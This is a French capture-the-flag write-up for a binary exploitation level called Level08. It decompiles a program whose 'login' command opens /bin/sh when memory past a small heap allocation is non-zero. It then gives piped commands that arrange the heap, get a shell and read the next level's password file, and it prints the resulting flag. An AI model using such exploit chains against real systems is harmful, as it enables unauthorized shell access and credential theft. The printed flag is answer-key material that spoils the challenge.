# Rapport CTF - [Level08]

### Observation :
En arrivant sur le level8 on trouve un exécutable nommé level8.\
Quand nous essayons de le lancer, et nous obtenons une chaîne de caractère `(nil), (nil)` qui se répète dès que l'on fini une string. \
Regardons donc avec gdb ou un decompilateur.

### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
```
Ok, que nous donne ce code:
- si on fait `"auth "` on malloc 4 octets.
- si on fait `"reset"` on free auth.
- si on fait `"servic"` (uniquement, 6 a comparé.) on malloc `v6 = 128`.
- si on fait `"login"` on regarde si auth + 8 n'est pas vide pour `/bin/sh`, sinon cela écrit `"Password:\n"` .

### Solution :
Le but est donc de créer `auth` puis mettre de la mémoire a auth+8 avec `servic` puis essayer de `login` pour avoir accès a un shell.

On fait la commande suivante pour obtenir le flag :
```sh
(echo "auth "; echo "servic";echo "service"; echo "login"; echo $(echo "cat /home/user/level9/.pass")) | ./level8
--------------------------------------------------
(echo "auth "; echo "servicE0123456789abcdef"; echo "login"; echo $(echo "cat /home/user/level9/.pass")) | ./level8

```

### Resultat :
```sh
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
